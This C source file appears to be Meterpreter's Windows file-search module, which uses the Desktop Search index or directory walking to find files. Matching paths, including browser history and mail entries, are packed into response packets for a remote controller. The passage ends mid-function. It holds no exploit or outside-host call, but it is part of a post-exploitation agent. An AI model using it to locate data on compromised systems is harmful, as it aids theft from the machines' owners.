/*
 * Meterpreter support for searching the file system on Windows for a file pattern. 
 * Supports Windows NT4 up to and including Windows 7. When available it will 
 * leverage the local index via Windows Desktop Search (WDS) to speed up the search
 * process. WDS version 2 is supported for older systems (Windows 2000/XP/2003), 
 * and version 3 is supported for newer systems (Vista and above by default, Windows
 * XP/2003 with an addon). When a directory is not indexed the fallback search 
 * technique uses FindFirstFile/FindNextFile.
 *
 * sf - August 2010
 */
#include "precomp.h"
#include "fs.h"
#include "search.h"

/*
 * Helper function to add a search result to the response packet.
 */
VOID search_add_result( Packet * pResponse, char * cpDirectory, char * cpFileName, DWORD dwFileSize )
{	
	Tlv entry[3] = {0};
	DWORD dwSize = 0;

	do
	{
		entry[0].header.type   = TLV_TYPE_FILE_PATH;
		entry[0].header.length = (DWORD)( strlen(cpDirectory) + 1 );
		entry[0].buffer        = cpDirectory;

		entry[1].header.type   = TLV_TYPE_FILE_NAME;
		entry[1].header.length = (DWORD)( strlen(cpFileName) + 1 );
		entry[1].buffer        = cpFileName;

		dwSize = htonl( dwFileSize );
		entry[2].header.type   = TLV_TYPE_FILE_SIZE;
		entry[2].header.length = sizeof(DWORD);
		entry[2].buffer        = (PUCHAR)&dwSize;

		packet_add_tlv_group( pResponse, TLV_TYPE_SEARCH_RESULTS, entry, 3 );

	} while( 0 );
}

/*
 * Helper function to initilize the Windows Desktop Search v2 and v3 interfaces (if available).
 */
VOID wds_startup( WDS_INTERFACE * pWDSInterface )
{
	DWORD dwResult = ERROR_SUCCESS;
	HRESULT hr     = 0;

	do
	{
		if( !pWDSInterface )
			BREAK_WITH_ERROR( "[SEARCH] wds_startup: !pWDSInterface", ERROR_INVALID_HANDLE );

		memset( pWDSInterface, 0, sizeof(WDS_INTERFACE) );

		hr = CoInitialize( NULL );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds_startup: CoInitializeEx Failed", hr );

		do
		{
			pWDSInterface->hQuery = LoadLibraryA( "query.dll" );
			if( !pWDSInterface->hQuery )
				BREAK_ON_ERROR( "[SEARCH] wds_startup:v2: LoadLibraryA query.dll Failed" );

			pWDSInterface->pLocateCatalogsA = (LOCATECATALOGSA)GetProcAddress( pWDSInterface->hQuery, "LocateCatalogsA" );
			if( !pWDSInterface->pLocateCatalogsA )
				BREAK_ON_ERROR( "[SEARCH] wds_startup:v2: GetProcAddress LocateCatalogsA Failed" );

			pWDSInterface->pCIMakeICommand = (CIMAKEICOMMAND)GetProcAddress( pWDSInterface->hQuery, "CIMakeICommand" );
			if( !pWDSInterface->pCIMakeICommand )
				BREAK_ON_ERROR( "[SEARCH] wds_startup:v2: GetProcAddress CIMakeICommand Failed" );

			pWDSInterface->pCITextToFullTree = (CITEXTTOFULLTREE)GetProcAddress( pWDSInterface->hQuery, "CITextToFullTree" );
			if( !pWDSInterface->pCITextToFullTree )
				BREAK_ON_ERROR( "[SEARCH] wds_startup:v2: GetProcAddress CITextToFullTree Failed" );
			
			pWDSInterface->bWDS2Available = TRUE;

		} while( 0 );

		do
		{
			hr = CoCreateInstance( &_CLSID_CSearchManager, NULL, CLSCTX_ALL, &_IID_ISearchManager, (LPVOID *)&pWDSInterface->pSearchManager );
			if( FAILED( hr ) )
				BREAK_WITH_ERROR( "[SEARCH] wds_startup:v3: CoCreateInstance _IID_ISearchManager Failed", hr );

			hr = ISearchManager_GetCatalog( pWDSInterface->pSearchManager, L"SystemIndex", &pWDSInterface->pSearchCatalogManager );
			if( FAILED( hr ) )
				BREAK_WITH_ERROR( "[SEARCH] wds_startup:v3: ISearchManager_GetCatalog Failed", hr );

			hr = ISearchCatalogManager_GetCrawlScopeManager( pWDSInterface->pSearchCatalogManager, &pWDSInterface->pCrawlScopeManager );
			if( FAILED( hr ) )
				BREAK_WITH_ERROR( "[SEARCH] wds_startup:v3: ISearchCatalogManager_GetCrawlScopeManager Failed", hr );
				
			pWDSInterface->bWDS3Available = TRUE;

		} while( 0 );

	} while( 0 );
}

/*
 * Helper function to cleanup the Windows Desktop Search v2 and v3 interfaces.
 */
VOID wds_shutdown( WDS_INTERFACE * pWDSInterface )
{
	do
	{
		if( !pWDSInterface )
			break;

		if( pWDSInterface->hQuery )
			FreeLibrary( pWDSInterface->hQuery );

		pWDSInterface->pLocateCatalogsA  = NULL;
		pWDSInterface->pCIMakeICommand   = NULL;
		pWDSInterface->pCITextToFullTree = NULL;

		pWDSInterface->bWDS2Available    = FALSE;

		if( pWDSInterface->pCrawlScopeManager )
		{
			ISearchCrawlScopeManager_Release( pWDSInterface->pCrawlScopeManager );
			pWDSInterface->pCrawlScopeManager = NULL;
		}

		if( pWDSInterface->pSearchCatalogManager )
		{
			ISearchCatalogManager_Release( pWDSInterface->pSearchCatalogManager );
			pWDSInterface->pSearchCatalogManager = NULL;
		}

		if( pWDSInterface->pSearchManager )
		{
			ISearchManager_Release( pWDSInterface->pSearchManager );
			pWDSInterface->pSearchManager = NULL;
		}

		pWDSInterface->bWDS3Available = FALSE;

		CoUninitialize();

	} while( 0 );
}

/*
 * Helper function to check if a given directory is indexed in the WDS v2 system catalog on the local machine.
 */
BOOL wds2_indexed( WDS_INTERFACE * pWDSInterface, char * cpDirectory )
{
	char cMachine[ MAX_COMPUTERNAME_LENGTH + 1 ] = {0};
	char cCatalog[ MAX_PATH + 1 ]                = {0};
	DWORD dwMachineLength                        = MAX_COMPUTERNAME_LENGTH + 1;
	DWORD dwCatalogLength                        = MAX_PATH + 1 ;
	DWORD dwIndex                                = 0;

	do
	{
		if( !pWDSInterface->bWDS2Available )
			break;

		while( TRUE )
		{
			if( pWDSInterface->pLocateCatalogsA( cpDirectory, dwIndex++, cMachine, &dwMachineLength, cCatalog, &dwCatalogLength ) != S_OK )
				break;

			if( strcmp( cMachine, "." ) != 0 )
				continue;

			if( _memicmp( "system", cCatalog, 6 ) != 0 )
				continue;

			dprintf( "[SEARCH] wds2_indexed: Directory '%s' is indexed.", cpDirectory );

			return TRUE;
		}

	} while( 0 );

	return FALSE;
}

/*
 * Helper function to check if a given directory is indexed in the WDS v3 crawl scope
 */
BOOL wds3_indexed( WDS_INTERFACE * pWDSInterface, char * cpDirectory )
{
	HRESULT hr          = 0;
	size_t dwLength     = 0;
	WCHAR * wpDirectory = NULL;
	BOOL bResult        = FALSE;

	do
	{
		if( !pWDSInterface->bWDS3Available )
			break;

		dwLength = mbstowcs( NULL, cpDirectory, 0 ) + 1;

		wpDirectory = (WCHAR *)malloc( dwLength * sizeof(WCHAR) );
		if( !wpDirectory )
			break;

		memset( wpDirectory, 0, dwLength * sizeof(WCHAR) );
				
		if( mbstowcs( wpDirectory, cpDirectory, dwLength ) == -1 )
			break;

		ISearchCrawlScopeManager_IncludedInCrawlScope( pWDSInterface->pCrawlScopeManager, wpDirectory, &bResult );

	} while( 0 );

	if( wpDirectory )
		free( wpDirectory );

	return bResult;
}

/*
 * Helper function to execute a WDS v2 or v3 search via COM and process
 * any results (assumes rows have columns of 'size,path').
 */
HRESULT wds_execute( ICommand * pCommand, Packet * pResponse )
{
	IRowset * pRowset           = NULL;
	IAccessor * pAccessor       = NULL;
	size_t dwLength             = 0;
	HACCESSOR hAccessor         = 0;
	DBCOUNTITEM dbCount         = 0;
	DWORD dwResult              = 0;
	HRESULT hr                  = 0;
	DBBINDING dbBindings[2]     = {0};
	SEARCH_ROW rowSearchResults = {0};
	HROW hRow[1]                = {0};
	HROW * pRows                = &hRow[0];

	do
	{
		hr = ICommand_Execute( pCommand, NULL, &_IID_IRowset, NULL, NULL, (IUnknown**)&pRowset );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds_execute: ICommand_Execute Failed", hr );
		
		hr = IRowset_QueryInterface( pRowset, &_IID_IAccessor, (LPVOID *)&pAccessor );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds_execute: IRowset_QueryInterface _IID_IAccessor Failed", hr );

		memset( &dbBindings, 0, sizeof(DBBINDING)*2 );

		dbBindings[0].iOrdinal   = 1;
		dbBindings[0].dwPart     = DBPART_STATUS | DBPART_LENGTH | DBPART_VALUE;
		dbBindings[0].dwMemOwner = DBMEMOWNER_CLIENTOWNED;
		dbBindings[0].cbMaxLen   = sizeof(DWORD);
		dbBindings[0].dwFlags    = 0;
		dbBindings[0].eParamIO   = DBPARAMIO_NOTPARAM;
		dbBindings[0].wType      = DBTYPE_I4;
		dbBindings[0].obStatus   = offsetof( SEARCH_ROW, dbSizeStatus );
		dbBindings[0].obLength   = offsetof( SEARCH_ROW, dwSizeLength );
		dbBindings[0].obValue    = offsetof( SEARCH_ROW, dwSizeValue );

		dbBindings[1].iOrdinal   = 2;
		dbBindings[1].dwPart     = DBPART_STATUS | DBPART_LENGTH | DBPART_VALUE;
		dbBindings[1].dwMemOwner = DBMEMOWNER_CLIENTOWNED;
		dbBindings[1].cbMaxLen   = MAX_PATH;
		dbBindings[1].dwFlags    = 0;
		dbBindings[1].eParamIO   = DBPARAMIO_NOTPARAM;
		dbBindings[1].wType      = DBTYPE_STR;
		dbBindings[1].obStatus   = offsetof( SEARCH_ROW, dbPathStatus );
		dbBindings[1].obLength   = offsetof( SEARCH_ROW, dwPathLength );
		dbBindings[1].obValue    = offsetof( SEARCH_ROW, cPathValue );

		hr = IAccessor_CreateAccessor( pAccessor, DBACCESSOR_ROWDATA, 2, (DBBINDING *)&dbBindings, 0, &hAccessor, NULL );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds_execute: IAccessor_CreateAccessor Failed", hr );
		
		while( TRUE )
		{
			memset( &rowSearchResults, 0, sizeof(SEARCH_ROW) );

			hr = IRowset_GetNextRows( pRowset, DB_NULL_HCHAPTER, 0, 1, &dbCount, (HROW **)&pRows );
			if( FAILED( hr ) )
				BREAK_WITH_ERROR( "[SEARCH] wds_execute: IRowset_GetNextRows Failed", hr );

			if( !dbCount )
				BREAK_WITH_ERROR( "[SEARCH] wds_execute: No more rows to get.", ERROR_SUCCESS );

			hr = IRowset_GetData( pRowset, hRow[0], hAccessor, &rowSearchResults );
			if( FAILED( hr ) )
				BREAK_WITH_ERROR( "[SEARCH] wds_execute: IRowset_GetData Failed", hr );
			
			if( _memicmp( "iehistory:", rowSearchResults.cPathValue, 10 ) == 0 )
			{
				// "iehistory://{*}/"
				char * cpHistory = strstr( rowSearchResults.cPathValue, "}" );
				if( cpHistory )
					search_add_result( pResponse, "", cpHistory+2, 0 );
			}
			else if( _memicmp( "mapi:", rowSearchResults.cPathValue, 5 ) == 0 )
			{
				// "mapi://{*}/"
				char * cpHistory = strstr( rowSearchResults.cPathValue, "}" );
				if( cpHistory )
					search_add_result( pResponse, "", cpHistory+2, 0 );
			}
			else if( rowSearchResults.dwSizeValue > 0 )
			{
				size_t i           = 0;
				char * cpFileName  = "";
				char * cpFile      = "";
				char * cpDirectory = (char *)&rowSearchResults.cPathValue;

				if( _memicmp( "file:", cpDirectory, strlen("file:") ) == 0 )
					cpDirectory = (char *)( cpDirectory + strlen("file:") );

				for( i=0 ; i<strlen(cpDirectory) ; i++ )
				{
					if( cpDirectory[i] == '/' )
						cpDirectory[i] = '\\';
				}

				cpFile = strrchr( cpDirectory, '\\' );
				if( cpFile )
				{
					*cpFile    = '\x00';
					cpFileName = cpFile + 1;
				}
				else
				{
					cpDirectory = "";
					cpFileName  = cpDirectory;
				}

				search_add_result( pResponse, cpDirectory, cpFileName, rowSearchResults.dwSizeValue );

				dprintf( "[SEARCH] wds_execute. Found: %s\\%s", cpDirectory, cpFileName );
			}

			hr = IRowset_ReleaseRows( pRowset, dbCount, pRows, NULL, NULL, NULL );
			if( FAILED( hr ) )
				BREAK_WITH_ERROR( "[SEARCH] wds_execute: IRowset_ReleaseRows Failed", hr );
		}

	} while( 0 );

	if( pAccessor )
	{
		IAccessor_ReleaseAccessor( pAccessor, hAccessor, NULL );
		IAccessor_Release( pAccessor );
	}

	if( pRowset )
		IRowset_Release( pRowset );

	return dwResult;
}

/*
 * Search via Windows Desktop Search v2 via COM
 */
DWORD wds2_search( WDS_INTERFACE * pWDSInterface, char * cpCurrentDirectory, SEARCH_OPTIONS * pOptions, Packet * pResponse )
{
	DWORD dwResult              = ERROR_SUCCESS;
	ICommand * pCommand         = NULL;
	DBCOMMANDTREE * pTree       = NULL;
	ICommandTree * pCommandTree = NULL;
	WCHAR * wpQuery             = NULL;
	WCHAR * wpFileGlob          = NULL;
	WCHAR * wpCurrentDirectory  = NULL;
	char * cpNewCurrent         = NULL;
	DWORD dwDepth[1]            = {0};
	WCHAR * wcScope[1]          = {0};
	WCHAR * wcCatalog[1]        = {0};
	WCHAR * wcMachines[1]       = {0};
	HRESULT hr                  = 0;
	size_t dwLength             = 0;


	dprintf( "[SEARCH] wds2_search: Starting..." );

	do
	{
		if( !pWDSInterface  )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: !pWDSInterface", ERROR_INVALID_PARAMETER );

		if( !pWDSInterface->bWDS2Available )
			break;

		if( !pResponse || !pOptions )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: !pResultList || !pOptions", ERROR_INVALID_PARAMETER );

		if( !cpCurrentDirectory )
			cpCurrentDirectory = pOptions->cpRootDirectory;
				
		// sf: WDS v2 can bawk if a trailing slash is not present on some paths :/
		dwLength = strlen( cpCurrentDirectory );
		if( cpCurrentDirectory[dwLength-1] != '\\' )
		{
			cpNewCurrent = (char *)malloc( dwLength + 2 );
			if( !cpNewCurrent )
				BREAK_WITH_ERROR( "[SEARCH] wds2_search: !cpNewCurrent", ERROR_OUTOFMEMORY );

			memset( cpNewCurrent, 0, dwLength + 2 );

			sprintf( cpNewCurrent, "%s\\", cpCurrentDirectory );

			cpCurrentDirectory = cpNewCurrent;
		}

		if( pOptions->bResursive )
			dwDepth[0] = QUERY_DEEP | QUERY_PHYSICAL_PATH;
		else
			dwDepth[0] = QUERY_SHALLOW | QUERY_PHYSICAL_PATH;

		dwLength = mbstowcs( NULL, cpCurrentDirectory, 0 ) + 1;
	
		wpCurrentDirectory = (WCHAR *)malloc( dwLength * sizeof(WCHAR) );
		if( !wpCurrentDirectory )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: !wpCurrentDirectory", ERROR_OUTOFMEMORY );
		
		memset( wpCurrentDirectory, 0, dwLength * sizeof(WCHAR) );
		
		if( mbstowcs( wpCurrentDirectory, cpCurrentDirectory, dwLength ) == -1 )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: mbstowcs wpCurrentDirectory failed", ERROR_INVALID_PARAMETER );

		wcScope[0]    = wpCurrentDirectory;
		wcCatalog[0]  = L"System";
		wcMachines[0] = L".";

		hr = pWDSInterface->pCIMakeICommand( (ICommand**)&pCommand, 1, (DWORD *)&dwDepth, (WCHAR **)&wcScope, (WCHAR **)&wcCatalog, (WCHAR **)&wcMachines );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: CIMakeICommand Failed", hr );

		hr = ICommand_QueryInterface( pCommand, &_IID_ICommandTree, (LPVOID *)&pCommandTree );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: ICommand_QueryInterface Failed", hr );

		dwLength = mbstowcs( NULL, pOptions->cpFileGlob, 0 ) + 1;

		wpFileGlob = (WCHAR *)malloc( dwLength * sizeof(WCHAR) );
		if( !wpFileGlob )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: !wpFileGlob", ERROR_OUTOFMEMORY );

		wpQuery = (WCHAR *)malloc( ( dwLength + 128 ) * sizeof(WCHAR) );
		if( !wpQuery )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: !wpQuery", ERROR_OUTOFMEMORY );

		memset( wpFileGlob, 0, dwLength * sizeof(WCHAR) );
		memset( wpQuery, 0, ( dwLength + 128 ) * sizeof(WCHAR) );

		if( mbstowcs( wpFileGlob, pOptions->cpFileGlob, dwLength ) == -1 )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: mbstowcs wpFileGlob failed", ERROR_INVALID_PARAMETER );

		swprintf_s( wpQuery, ( dwLength + 128 ), L"#filename = %s", wpFileGlob );

		hr = pWDSInterface->pCITextToFullTree( wpQuery, L"size,path", NULL, NULL, &pTree, 0, NULL, GetSystemDefaultLCID() );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: CITextToFullTree Failed", hr );

		hr = ICommandTree_SetCommandTree( pCommandTree, &pTree, DBCOMMANDREUSE_NONE, FALSE );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: ICommandTree_SetCommandTree Failed", hr );

		hr = wds_execute( pCommand, pResponse );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds2_search: wds_execute Failed", hr );

	} while( 0 );

	if( pCommandTree )
		ICommandTree_Release( pCommandTree );

	if( pCommand )
		ICommand_Release( pCommand );

	if( wpFileGlob )
		free( wpFileGlob );

	if( wpQuery )
		free( wpQuery );

	if( wpCurrentDirectory )
		free( wpCurrentDirectory );
				
	if( cpNewCurrent )
		free( cpNewCurrent );

	dprintf( "[SEARCH] wds2_search: Finished." );
	
	return dwResult;
}

/*
 * Search via Windows Desktop Search >= 3.0 via COM ...yuk! would a kernel32!FileSearch( "*.doc" ) have killed them!?!?
 */
DWORD wds3_search( WDS_INTERFACE * pWDSInterface, WCHAR * wpProtocol, char * cpCurrentDirectory, SEARCH_OPTIONS * pOptions, Packet * pResponse )
{
	DWORD dwResult                    = ERROR_SUCCESS;
	WCHAR * wpSQL                     = NULL;
	WCHAR * wpQuery                   = NULL;
	WCHAR * wpConnectionString        = NULL;
	ISearchQueryHelper * pQueryHelper = NULL;
	IDataInitialize * pDataInitialize = NULL;
	IDBInitialize * pIDBInitialize    = NULL;
	IDBCreateSession * pSession       = NULL;
	IOpenRowset * pOpenRowset         = NULL;
	IDBCreateCommand * pCreateCommand = NULL;
	ICommand * pCommand               = NULL;
	ICommandText * pCommandText       = NULL;
	HRESULT hr                        = 0;
	size_t dwLength                   = 0;

	dprintf( "[SEARCH] wds3_search: Starting..." );

	do
	{
		if( !pWDSInterface  )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: !pWDSInterface", ERROR_INVALID_PARAMETER );

		if( !pWDSInterface->bWDS3Available )
			break;

		if( !pResponse || !pOptions || !wpProtocol  )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: !pResultList || !pOptions || !wpProtocol", ERROR_INVALID_PARAMETER );

		if( !cpCurrentDirectory )
			cpCurrentDirectory = pOptions->cpRootDirectory;

		hr = ISearchCatalogManager_GetQueryHelper( pWDSInterface->pSearchCatalogManager, &pQueryHelper );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: ISearchCatalogManager_GetQueryHelper Failed", hr );

		hr = ISearchQueryHelper_put_QuerySelectColumns( pQueryHelper, L"size,path" );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: ISearchQueryHelper_put_QuerySelectColumns Failed", hr );
		
		if( cpCurrentDirectory )
		{
			WCHAR * wpWhere         = NULL;
			WCHAR * wpRootDirectory = NULL;

			do
			{
				dwLength = mbstowcs( NULL, cpCurrentDirectory, 0 ) + 1;

				wpWhere = (WCHAR * )malloc( (dwLength+128) * sizeof(WCHAR) );
				if( !wpWhere )
					BREAK_WITH_ERROR( "[SEARCH] wds3_search: !wpWhere", ERROR_OUTOFMEMORY );

				wpRootDirectory = (WCHAR * )malloc( dwLength * sizeof(WCHAR) );
				if( !wpRootDirectory )
					BREAK_WITH_ERROR( "[SEARCH] wds3_search: !wpRootDirectory", ERROR_OUTOFMEMORY );

				memset( wpRootDirectory, 0, dwLength * sizeof(WCHAR) );

				if( mbstowcs( wpRootDirectory, cpCurrentDirectory, dwLength ) == -1 )
					BREAK_WITH_ERROR( "[SEARCH] wds3_search: mbstowcs wpRootDirectory failed", ERROR_INVALID_PARAMETER );

				if( pOptions->bResursive )
					wsprintfW( (LPWSTR)wpWhere, L"AND SCOPE='%s:%s'", wpProtocol, wpRootDirectory );
				else
					wsprintfW( (LPWSTR)wpWhere, L"AND DIRECTORY='%s:%s'", wpProtocol, wpRootDirectory );
			
				hr = ISearchQueryHelper_put_QueryWhereRestrictions( pQueryHelper, wpWhere );
				if( FAILED( hr ) )
					BREAK_WITH_ERROR( "[SEARCH] wds3_search: ISearchQueryHelper_put_QueryWhereRestrictions Failed", hr );

			} while( 0 );

			if( wpWhere )
				free( wpWhere );

			if( wpRootDirectory )
				free( wpRootDirectory );
		}

		dwLength = mbstowcs( NULL, pOptions->cpFileGlob, 0 ) + 1;

		wpQuery = (WCHAR *)malloc( dwLength * sizeof(WCHAR) );
		if( !wpQuery )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: !wpQuery", ERROR_OUTOFMEMORY );

		memset( wpQuery, 0, dwLength * sizeof(WCHAR) );

		if( mbstowcs( wpQuery, pOptions->cpFileGlob, dwLength ) == -1 )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: mbstowcs wpQuery failed", ERROR_INVALID_PARAMETER );

		hr = ISearchQueryHelper_GenerateSQLFromUserQuery( pQueryHelper, wpQuery, &wpSQL );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: ISearchQueryHelper_GenerateSQLFromUserQuery Failed", hr );
		
		hr = CoCreateInstance( &_CLSID_MSDAInitialize, NULL, CLSCTX_ALL, &_IID_IDataInitialize, (LPVOID *)&pDataInitialize );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: CoCreateInstance _IID_IDataInitialize Failed", hr );

		hr = ISearchQueryHelper_get_ConnectionString( pQueryHelper, &wpConnectionString );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: ISearchQueryHelper_get_ConnectionString _IID_IDataInitialize Failed", hr );

		hr = IDataInitialize_GetDataSource( pDataInitialize, NULL, CLSCTX_INPROC_SERVER, wpConnectionString, &_IID_IDBInitialize, (IUnknown**)&pIDBInitialize );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: IDataInitialize_GetDataSource Failed", hr );

		hr = IDBInitialize_Initialize( pIDBInitialize );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: IDBInitialize_Initialize Failed", hr );

		hr = IDBInitialize_QueryInterface( pIDBInitialize, &_IID_IDBCreateSession, (LPVOID *)&pSession );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: IDBInitialize_QueryInterface Failed", hr );

		hr = IDBCreateSession_CreateSession( pSession, NULL, &_IID_IOpenRowset, (IUnknown**)&pOpenRowset );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: IDBCreateSession_CreateSession Failed", hr );

		hr = IOpenRowset_QueryInterface( pOpenRowset, &_IID_IDBCreateCommand, (LPVOID *)&pCreateCommand );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: IOpenRowset_QueryInterface Failed", hr );

		hr = IDBCreateCommand_CreateCommand( pCreateCommand, NULL, &_IID_ICommand, (IUnknown**)&pCommand );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: IDBCreateCommand_CreateCommand Failed", hr );

		hr = ICommand_QueryInterface( pCommand, &_IID_ICommandText, (LPVOID *)&pCommandText );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: ICommand_QueryInterface Failed", hr );

#ifdef DEBUGTRACE
		OutputDebugStringW( wpSQL );
#endif

		hr = ICommandText_SetCommandText( pCommandText, &DBGUID_DEFAULT, wpSQL ); 
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: ICommandText_SetCommandText Failed", hr );

		hr = wds_execute( pCommand, pResponse );
		if( FAILED( hr ) )
			BREAK_WITH_ERROR( "[SEARCH] wds3_search: wds_execute Failed", hr );

	} while( 0 );

	dprintf( "[SEARCH] wds3_search: Releasing COM objects..." );

	if( pCommandText )
		ICommandText_Release( pCommandText );

	if( pCreateCommand )
		IDBCreateCommand_Release( pCreateCommand );

	if( pCommand )
		ICommand_Release( pCommand );

	if( pOpenRowset )
		IOpenRowset_Release( pOpenRowset );

	if( pSession )
		IDBCreateSession_Release( pSession );
	
	if( pQueryHelper )
		ISearchQueryHelper_Release( pQueryHelper );

	if( pIDBInitialize )
		IDBInitialize_Release( pIDBInitialize );

	if( pDataInitialize )
		IDataInitialize_Release( pDataInitialize );

	if( wpQuery )
		free( wpQuery );

	dprintf( "[SEARCH] wds3_search: Finished." );

	return dwResult;
}

/*
 * Search a directory for files.
 */
DWORD search_directory( char * cpDirectory, SEARCH_OPTIONS * pOptions, Packet * pResponse )
{
	DWORD dwResult           = ERROR_SUCCESS;
	HANDLE hFile             = NULL;
	char * cpFirstFile       = NULL;
	WIN32_FIND_DATA FindData = {0};
	size_t dwLength          = 0;

	do
	{
		dwLength    = strlen( cpDirectory ) + strlen( pOptions->cpFileGlob ) + 32;
		cpFirstFile = (char *)malloc( dwLength );
		if( !cpFirstFile )
			BREAK_WITH_ERROR( "[SEARCH] search_directory: !cpFirstFile", ERROR_OUTOFMEMORY );

		sprintf_s( cpFirstFile, dwLength, "%s\\%s", cpDirectory, pOptions->cpFileGlob );

		hFile = FindFirstFile( cpFirstFile, &FindData );
		if( hFile == INVALID_HANDLE_VALUE )
		{
			// if not files in this directory matched our pattern, finish with success
			if( GetLastError() == ERROR_FILE_NOT_FOUND )
				break;
			// otherwise we fail with an error
			BREAK_ON_ERROR( "[SEARCH] search_directory: FindFirstFile Failed." );
		}

		do
		{
			do
			{
				if( strcmp( FindData.cFileName, "." ) == 0 )
					break;

				if( strcmp( FindData.cFileName, ".." ) == 0 )
					break;
				
				if( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
					break;

				search_add_result( pResponse, cpDirectory, FindData.cFileName, FindData.nFileSizeLow );

				dprintf( "[SEARCH] search_directory. Found: %s\\%s", cpDirectory, FindData.cFileName  );

			} while( 0 );

		} while( FindNextFile( hFile, &FindData ) != 0  );

	} while( 0 );

	if( cpFirstFile )
		free( cpFirstFile );

	if( hFile )
		FindClose( hFile );

	return dwResult;
}

/*
 * Perform a file search using Windows Desktop Search (v2 or v3 depending what's available) 
 * and falling back to a FindFirstFile/FindNextFile search technique if not.
 */
DWORD search( WDS_INTERFACE * pWDSInterface, char * cpCurrentDirectory, SEARCH_OPTIONS * pOptions, Packet * pResponse )
{
	DWORD dwResult           = ERROR_ACCESS_DENIED;
	HANDLE hFile             = NULL;
	char * cpFirstFile       = NULL;
	BOOL bAllreadySearched   = FALSE;
	WIN32_FIND_DATA FindData = {0};
	size_t dwLength          = 0;

	do
	{
		if( !pResponse || !pOptions )
			BREAK_WITH_ERROR( "[SEARCH] search: !pResponse || !pOptions", ERROR_INVALID_PARAMETER );

		if( !cpCurrentDirectory )
			cpCurrentDirectory = pOptions->cpRootDirectory;

		if( wds3_indexed( pWDSInterface, cpCurrentDirectory ) )
		{
			dwResult = wds3_search( pWDSInterface, L"file", cpCurrentDirectory, pOptions, pResponse );
		}

		if( dwResult != ERROR_SUCCESS && wds2_indexed( pWDSInterface, cpCurrentDirectory ) )
		{
			dwResult = wds2_search( pWDSInterface, cpCurrentDirectory, pOptions, pResponse );
		}

		if( dwResult != ERROR_SUCCESS )
		{
			dwResult    = ERROR_SUCCESS;
			dwLength    = strlen( cpCurrentDirectory ) + 32;
			cpFirstFile = (char *)malloc( dwLength );
			if( !cpFirstFile )
				BREAK_WITH_ERROR( "[SEARCH] search: !cpFirstFile", ERROR_OUTOFMEMORY );

			sprintf_s( cpFirstFile, dwLength, "%s\\*.*", cpCurrentDirectory );

			hFile = FindFirstFile( cpFirstFile, &FindData );
			if( hFile == INVALID_HANDLE_VALUE )
			{
				if( GetLastError() == ERROR_ACCESS_DENIED )
					break;
				BREAK_ON_ERROR( "[SEARCH] search: FindFirstFile Failed." );
			}
			do
			{
				if( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
				{
					do
					{
						char * cpNextDirectory = NULL;
						
						if( !pOptions->bResursive )
							break;

						if( strcmp( FindData.cFileName, "." ) == 0 )
							break;

						if( strcmp( FindData.cFileName, ".." ) == 0 )
							break;

						dwLength        = strlen( cpCurrentDirectory ) + strlen( FindData.cFileName ) + 32;
						cpNextDirectory = (char *)malloc( dwLength );
						if( !cpNextDirectory )
							break;

						sprintf_s( cpNextDirectory, dwLength, "%s\\%s", cpCurrentDirectory, FindData.cFileName );

						dwResult = search( pWDSInterface, cpNextDirectory, pOptions, pResponse );

						free( cpNextDirectory );

					} while( 0 );
				}
				else
				{
					if( !bAllreadySearched )
					{
						// we call search_dir_via_api() to avail of glob searching via a second 
						// FindFirstFile() loop (which is available on NT4 and up, unlike PathMatchSpec())
						dwResult = search_directory( cpCurrentDirectory, pOptions, pResponse );
	
						bAllreadySearched = TRUE;
					}
				}

			} while( FindNextFile( hFile, &FindData ) != 0  );
		}

	} while( 0 );

	if( cpFirstFile )
		free( cpFirstFile );

	if( hFile )
		FindClose( hFile );

	return dwResult;
}

/*
 * Request routine for performing a file search.
 */
DWORD request_fs_search( Remote * pRemote, Packet * pPacket )
{
	DWORD dwResult              = ERROR_SUCCESS;
	Packet * pResponse          = NULL;
	SEARCH_OPTIONS * pOptions   = NULL;
	WDS_INTERFACE WDSInterface  = {0};

	dprintf( "[SEARCH] request_fs_search. Starting." );

	do
	{
		pResponse = packet_create_response( pPacket );
		if( !pResponse )
